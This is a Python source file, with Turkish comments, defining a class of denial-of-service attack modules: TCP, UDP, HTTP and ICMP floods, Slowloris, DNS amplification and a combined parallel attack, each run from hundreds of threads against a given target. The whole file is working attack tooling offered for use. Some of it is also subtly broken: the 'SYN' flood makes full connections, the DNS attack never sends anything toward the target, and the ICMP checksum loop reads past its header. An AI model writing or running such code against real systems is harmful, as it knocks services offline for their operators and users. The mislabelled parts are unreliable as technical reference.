#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading
import time
import random
import ssl
import struct
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor

class AttackModules:
    def __init__(self, max_threads=500):
        self.max_threads = max_threads
        self.running_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=max_threads)
    
    # TCP SYN Flood
    def tcp_syn_flood(self, target_ip, target_port, duration=60, packet_size=1024):
        end_time = time.time() + duration
        
        def syn_attack():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target_ip, target_port))
                    
                    # SYN paketi gönder
                    sock.send(random._urandom(packet_size))
                    sock.close()
                except:
                    pass
        
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=syn_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        return f"TCP SYN Flood completed against {target_ip}:{target_port}"
    
    # UDP Flood
    def udp_flood(self, target_ip, target_port, duration=60, packet_size=1024):
        end_time = time.time() + duration
        
        def udp_attack():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Randomize source port
                    sock.bind(('', random.randint(20000, 60000)))
                    
                    # Random data gönder
                    data = random._urandom(packet_size)
                    sock.sendto(data, (target_ip, target_port))
                    sock.close()
                except:
                    pass
        
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=udp_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        return f"UDP Flood completed against {target_ip}:{target_port}"
    
    # HTTP/HTTPS Flood
    def http_flood(self, target_url, duration=60, method="GET", user_agents=None):
        if user_agents is None:
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
            ]
        
        end_time = time.time() + duration
        
        def http_attack():
            while time.time() < end_time:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                        'Referer': 'http://www.google.com/'
                    }
                    
                    req = urllib.request.Request(
                        target_url,
                        headers=headers,
                        method=method
                    )
                    
                    if method == "POST":
                        # Random POST data
                        post_data = f"data={random.randint(1000, 9999)}".encode()
                        req = urllib.request.Request(
                            target_url,
                            data=post_data,
                            headers=headers,
                            method=method
                        )
                    
                    urllib.request.urlopen(req, timeout=5)
                except:
                    pass
        
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=http_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        return f"HTTP Flood completed against {target_url}"
    
    # Slowloris Attack
    def slowloris(self, target_ip, target_port, duration=300, sockets_count=200):
        end_time = time.time() + duration
        sockets = []
        
        # Socket oluştur
        for _ in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                
                # Bağlantıyı açık tut
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-language: en-US,en\r\n".encode())
                sockets.append(s)
            except:
                pass
        
        # Slowloris döngüsü
        while time.time() < end_time and sockets:
            for s in list(sockets):
                try:
                    # Keep-alive header gönder
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(random.uniform(10, 100))
                except:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
            
            # Yeni socket ekle
            while len(sockets) < sockets_count:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    sockets.append(s)
                except:
                    break
        
        # Temizle
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        return f"Slowloris completed against {target_ip}:{target_port}"
    
    # DNS Amplification
    def dns_amplification(self, dns_server, target_ip, duration=60):
        end_time = time.time() + duration
        
        def dns_attack():
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # DNS query (ANY record - büyük response)
                    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                    query += b'\x07example\x03com\x00\x00\xff\x00\x01'
                    
                    sock.sendto(query, (dns_server, 53))
                    sock.close()
                except:
                    pass
        
        threads = []
        for _ in range(min(self.max_threads, 100)):  # DNS için limit
            t = threading.Thread(target=dns_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        return f"DNS Amplification via {dns_server} to {target_ip}"
    
    # ICMP Flood (Ping Flood)
    def icmp_flood(self, target_ip, duration=60, packet_size=64):
        import os
        
        end_time = time.time() + duration
        
        def icmp_attack():
            while time.time() < end_time:
                try:
                    # Raw socket (Linux/Unix)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    
                    # ICMP Echo Request
                    header = struct.pack('!BBHHH', 8, 0, 0, 0, 0)
                    data = random._urandom(packet_size)
                    
                    # Checksum hesapla
                    checksum = 0
                    for i in range(0, len(header) + len(data), 2):
                        checksum += (header[i] << 8) + header[i+1]
                    checksum = (checksum >> 16) + (checksum & 0xffff)
                    checksum = ~checksum & 0xffff
                    
                    header = struct.pack('!BBHHH', 8, 0, checksum, 0, 0)
                    packet = header + data
                    
                    sock.sendto(packet, (target_ip, 0))
                    sock.close()
                except:
                    pass
        
        # Root gerektirir
        if os.geteuid() != 0:
            return "ICMP Flood requires root privileges"
        
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=icmp_attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        return f"ICMP Flood completed against {target_ip}"
    
    # Mixed Attack (Çoklu metod)
    def mixed_attack(self, target_ip, target_port, duration=120):
        results = []
        
        # Paralel saldırılar
        def run_parallel():
            threads = []
            
            # TCP
            t1 = threading.Thread(target=lambda: self.tcp_syn_flood(target_ip, target_port, duration//3))
            t1.start()
            threads.append(t1)
            
            # UDP
            t2 = threading.Thread(target=lambda: self.udp_flood(target_ip, target_port, duration//3))
            t2.start()
            threads.append(t2)
            
            # HTTP
            t3 = threading.Thread(target=lambda: self.http_flood(f"http://{target_ip}:{target_port}", duration//3))
            t3.start()
            threads.append(t3)
            
            for t in threads:
                t.join()
        
        run_parallel()
        return f"Mixed attack completed against {target_ip}:{target_port}"
    
    def stop_all_attacks(self):
        self.executor.shutdown(wait=False)
        self.running_attacks.clear()
        return "All attacks stopped"
                  
